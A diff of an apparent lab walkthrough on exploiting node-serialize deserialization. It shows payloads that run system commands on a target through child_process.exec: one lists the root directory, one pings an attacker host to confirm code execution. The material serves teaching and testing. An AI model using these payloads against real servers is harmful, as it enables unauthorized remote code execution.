@@ -82,14 +82,15 @@ In the image below, you can see an example of the usage of this functionality.
 As your next step, you have to craft such a payload that will execute system commands on the target website.
 You can find an example payload from the link provided earlier.
 
-```
+```bash
 {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
 ```
 
 To adapt this payload for our target application, we need to remove the dictionary structure, enclosing double quotes, and any escaped characters, keeping only the core payload.
 
 To test if the payload works, we can attempt to ping our attacking machine and verify whether the command executes. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
-```
+
+```bash
 _$$ND_FUNC$$_function (){require('child_process').exec('ping 10.10.128.2 -c 3', function(error, stdout, stderr) { console.log(stdout) });}()
 ```
 
